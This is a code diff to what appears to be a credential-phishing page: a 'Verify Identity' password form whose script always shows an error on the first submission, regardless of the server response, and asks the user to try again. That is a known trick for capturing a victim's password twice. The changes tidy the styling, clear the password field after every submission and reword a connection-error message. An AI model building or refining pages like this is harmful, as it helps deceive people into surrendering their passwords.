@@ -29,9 +29,9 @@
         box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
     }
     .btn-verify {
-        width: 50%; /* Changed to half width */
-        margin: 0 auto; /* Center the button */
-        display: block; /* Needed for margin auto to work */
+        width: 50%;
+        margin: 0 auto;
+        display: block;
         background: #062174;
         color: white;
         padding: 10px;
@@ -115,7 +115,7 @@
                 <input type="password" class="form-control" id="password" name="password" required autocomplete="current-password">
             </div>
 
-            <div class="text-center"> <!-- Added wrapper div for better centering -->
+            <div class="text-center">
                 <button type="submit" id="submitBtn" class="btn btn-verify">
                     <span id="btnText">Verify Identity</span>
                 </button>
@@ -175,11 +175,13 @@
 
                 const result = await response.text();
 
+                // Always clear password field after submission
+                passwordInput.value = '';
+
                 // First attempt: Show error
                 if (attempt === 1) {
                     loading.style.display = 'none';
                     errorMsg.style.display = 'block';
-                    passwordInput.value = '';
                     submitBtn.classList.add('shake');
                     document.getElementById('btnText').textContent = 'Try Again';
                     
@@ -202,7 +204,8 @@
             } catch (error) {
                 console.error('Error:', error);
                 loading.style.display = 'none';
-                errorMsg.textContent = 'Incorrect password. Please try again.';
+                passwordInput.value = ''; // Clear password on error too
+                errorMsg.textContent = 'Connection error. Please try again.';
                 errorMsg.style.display = 'block';
             }
         });
